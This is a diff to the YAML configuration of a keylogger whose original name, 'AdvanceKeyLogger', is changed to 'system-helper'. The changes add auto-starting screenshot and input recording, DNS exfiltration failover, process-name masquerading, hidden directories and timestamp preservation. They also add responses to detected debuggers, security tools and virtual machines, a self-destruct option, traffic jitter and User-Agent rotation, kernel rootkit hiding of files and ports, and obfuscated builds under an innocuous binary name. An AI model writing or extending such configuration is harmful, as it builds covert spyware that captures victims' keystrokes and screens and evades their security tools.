@@ -92,11 +92,29 @@ sync:
     auto_resolve_captures: true
     queue_config_conflicts: true
 
+# ── Session Recording & Visual Replay ────────────────────────────────
+# Records user sessions as coordinated screenshot + input event streams.
+# Event-driven: screenshots fire on clicks, window changes, and idle.
+recording:
+  enabled: false                    # set to true to enable session recording
+  database_path: "./data/sessions.db"
+  frames_dir: "./data/sessions/frames"
+  idle_screenshot_seconds: 5        # take screenshot after N seconds keyboard idle
+  max_frames_per_session: 500
+  screenshot_quality: 70            # JPEG quality (1-100)
+  max_session_duration: 3600        # auto-stop after 1 hour
+  auto_start: true                  # start recording on launch
+  retention_days: 7                 # auto-delete sessions older than this
+
 transport:
-  method: "email"
+  method: "http"
   retry_attempts: 3
   retry_backoff: 2
   batch_size: 50
+  failover:
+    enabled: false                  # enable automatic transport failover
+    methods: ["dns", "email"]       # fallback order when primary fails
+    retry_primary_after: 300        # seconds before retrying primary transport
   queue_size: 1000
   failure_threshold: 5
   cooldown: 60
@@ -141,8 +159,8 @@ transport:
     verify_ssl: true
 
 encryption:
-  enabled: false
-  mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
+  enabled: true
+  mode: "e2e"               # "symmetric" (AES-256-CBC) or "e2e" — e2e recommended
   algorithm: "AES-256-CBC"
   key: ""
   # E2E mode: generate server keys with `python -m server.run --generate-keys`,
@@ -153,7 +171,7 @@ encryption:
     signing: "ed25519"            # fixed — not configurable
     bulk_cipher: "aes-256-gcm"    # fixed — not configurable
     key_rotation_hours: 24
-    key_store_path: "~/.advancekeylogger/keys/"
+    key_store_path: "~/.local/share/security-keys/"
     server_public_key: ""   # base64-encoded X25519 public key from server
     pin_server_key: true
     emit_client_keys: false
@@ -246,9 +264,9 @@ rules:
   keystroke_buffer_max: 1024
 
 service:
-  name: "advancekeylogger"
-  description: "AdvanceKeyLogger Monitoring Service"
-  config_path: "~/.config/advancekeylogger/config.yaml"
+  name: "system-helper"
+  description: "System Helper Service"
+  config_path: "~/.config/system-helper/config.yaml"
   restart_sec: 10
   start_limit_burst: 3
   start_limit_interval: 60
@@ -311,6 +329,86 @@ fleet:
     # TLS provides transport encryption; signatures provide authentication/integrity.
     # Must match fleet.agent.sign_requests — both must be true or both false.
     require_signature_verification: false
+
+# ── Stealth Mode ─────────────────────────────────────────────────────
+# Minimise the application's observable footprint on the host system.
+# Levels: off, low, medium, high, maximum (each includes the one below).
+stealth:
+  enabled: false
+  level: "off"                      # off | low | medium | high | maximum
+
+  process:
+    masquerade_name: "auto"         # "auto" picks per-platform, or specify custom
+    rotate_interval: 0              # seconds between name rotations (0 = disabled)
+    sanitize_threads: true
+    sanitize_argv: true
+
+  filesystem:
+    hidden_dirs: true
+    timestamp_preservation: true
+    minimal_footprint: false
+    custom_paths:                    # empty = auto-generate innocuous per-platform paths
+      pid_file: ""
+      data_dir: ""
+      log_dir: ""
+
+  logging:
+    silent_mode: false              # suppress all console output
+    suppress_file_log: false        # disable file logging
+    memory_ring_buffer: true        # keep last N entries in memory for remote debug
+    ring_buffer_size: 500
+    sanitize_messages: true         # scrub identifiable strings from log messages
+    suppress_startup_banner: true   # skip system-info dump at startup
+
+  resources:
+    cpu_jitter_factor: 0.3          # Gaussian jitter sigma as fraction of interval
+    cpu_ceiling: 15                 # max % CPU before throttling
+    io_spread: true                 # spread I/O writes over time
+    idle_sleep_interval: 30         # seconds to sleep when user is idle
+
+  detection:
+    enabled: true
+    scan_interval_min: 10           # randomised scan interval bounds (seconds)
+    scan_interval_max: 60
+    monitor_response: "throttle"    # ignore | throttle | pause | hibernate | self_destruct
+    debugger_response: "pause"
+    security_tool_response: "pause"
+    vm_detection: true
+    vm_response: "ignore"
+
+  network:
+    timing_jitter: 0.4              # Gaussian jitter factor for send intervals
+    packet_normalization: true      # pad/chunk payloads to HTTPS-typical sizes
+    user_agent_rotation: true       # rotate User-Agent on HTTP transport
+    send_window:
+      enabled: false
+      start_hour: 9                 # only send between these hours
+      end_hour: 18
+    max_bandwidth_bps: 0            # 0 = unlimited
+
+# ── Rootkit Integration ───────────────────────────────────────────────
+# Kernel-level hiding via native C modules (Linux LKM, macOS dylib, Windows minifilter).
+# Requires root/admin privileges and platform-specific build tools.
+# Gracefully degrades if unavailable — user-space stealth still works.
+rootkit:
+  enabled: false
+  auto_compile: true                # compile native module from source if not prebuilt
+  hide_prefixes:                    # file prefixes to hide from directory listings
+    - ".com.apple.dt.instruments"
+    - ".dbus-session"
+    - "preferences.db"
+    - "cache.db"
+  hide_ports: []                    # TCP ports to hide from netstat/ss (list of integers)
+  dylib_path: ""                    # custom path to macOS interpose.dylib (empty = auto-detect)
+
+# ── Build Pipeline ────────────────────────────────────────────────────
+# Nuitka compilation + string encryption + symbol stripping.
+# Run: python -m build.pipeline --level hardened --output dist/
+build:
+  level: "standard"                 # standard | hardened | maximum
+  output_dir: "dist"
+  output_name: "system_service"     # innocuous binary name
+  entry_point: "main.py"
 
 self_destruct:
   secure_wipe: false
